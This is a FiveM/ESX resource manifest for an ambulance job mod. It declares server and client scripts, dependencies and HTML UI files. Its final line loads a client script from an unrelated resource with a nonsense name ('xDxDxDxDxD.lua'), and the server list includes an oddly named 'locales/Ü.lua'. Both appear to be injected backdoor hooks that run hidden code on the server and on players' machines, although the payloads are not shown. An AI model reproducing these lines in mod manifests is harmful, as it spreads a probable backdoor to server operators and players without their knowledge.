resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Ambulance Job'

version '1.2.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/Ü.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/*.lua',
	'config.lua',
	'client/main.lua',
	'client/job.lua'
}

dependencies {
	'es_extended',
	'esx_vehicleshop'
}

files {
	'html/ui.html',
	'html/style.css',
	'html/script.js',
	'html/debounce.min.js',
	'html/BebasNeueBold.ttf'
}

ui_page 'html/ui.html'

client_script '@Sakura_AutoMods/xDxDxDxDxD.lua'